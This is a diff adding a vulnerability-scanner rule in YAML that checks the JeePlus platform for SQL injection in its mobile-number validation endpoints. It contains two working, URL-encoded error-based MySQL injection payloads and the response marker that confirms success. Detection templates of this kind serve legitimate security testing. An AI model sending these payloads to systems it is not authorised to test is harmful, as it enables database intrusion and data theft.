@@ -1,0 +1,16 @@
+name: JeePlus-快速开发平台-validateMobile-SQL
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/a/sys/user/validateMobileExist?&mobile=1%27+AND+GTID_SUBSET%28CONCAT%280x71626b7171%2C%28SELECT+%28ELT%285680%3D5680%2C1%29%29%29%2C0x7176767671%29%2C5680%29--+ywwp"
+    expression:
+      status: 500
+      body_all: ["qbkqq1qvvvq"]
+  - method: GET
+    path: "/a/sys/user/validateMobile?&mobile=1%27+AND+GTID_SUBSET%28CONCAT%280x71626b7171%2C%28SELECT+%28ELT%285680%3D5680%2C1%29%29%29%2C0x7176767671%29%2C5680%29--+ywwp"
+    expression:
+      status: 500
+      body_all: ["qbkqq1qvvvq"]
